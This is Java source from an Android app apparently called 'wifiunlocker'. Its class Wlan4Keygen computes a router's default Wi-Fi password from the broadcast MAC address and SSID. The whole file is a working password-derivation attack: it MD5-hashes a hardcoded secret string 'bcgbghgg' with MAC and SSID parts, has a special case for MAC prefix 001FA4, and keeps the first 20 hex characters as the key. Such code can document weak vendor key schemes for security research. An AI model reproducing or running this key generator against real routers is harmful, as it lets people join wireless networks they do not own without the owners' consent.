package com.zenkun.wifiunlocker;

import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import com.zenkun.wifiunlocker.R;

import android.content.res.Resources;
import android.os.Handler;
import android.os.Message;

public class Wlan4Keygen extends KeygenThread {

	public Wlan4Keygen(Handler h, Resources res) {
		super(h, res);
	}
	
	static final String magic = "bcgbghgg";
	public void run(){
		if ( router == null)
			return;
		try {
			md = MessageDigest.getInstance("MD5");
		} catch (NoSuchAlgorithmException e1) {
			handler.sendMessage(Message.obtain(handler, ERROR_MSG , 
					resources.getString(R.string.msg_nomd5)));
			return;
		}
		if ( router.getMac().length() != 12 ) 
		{
			handler.sendMessage(Message.obtain(handler, ERROR_MSG , 
					resources.getString(R.string.msg_errpirelli)));
			return;
		}
		String macMod = router.getMac().substring(0,8) + router.getSSIDsubpart();
		md.reset();
		try {
			if ( !router.getMac().toUpperCase().startsWith("001FA4") )
				md.update(magic.getBytes("ASCII"));
			if ( !router.getMac().toUpperCase().startsWith("001FA4") )
				md.update(macMod.toUpperCase().getBytes("ASCII"));
			else
				md.update(macMod.toLowerCase().getBytes("ASCII"));
			if ( !router.getMac().toUpperCase().startsWith("001FA4") )
				md.update(router.getMac().toUpperCase().getBytes("ASCII"));
			byte [] hash = md.digest();
			if  ( !router.getMac().toUpperCase().startsWith("001FA4") )
				pwList.add(StringUtils.getHexString(hash).substring(0,20));
			else
				pwList.add(StringUtils.getHexString(hash).substring(0,20).toUpperCase());
			handler.sendEmptyMessage(RESULTS_READY);
			return;
		} catch (UnsupportedEncodingException e) {}
		
	}

}
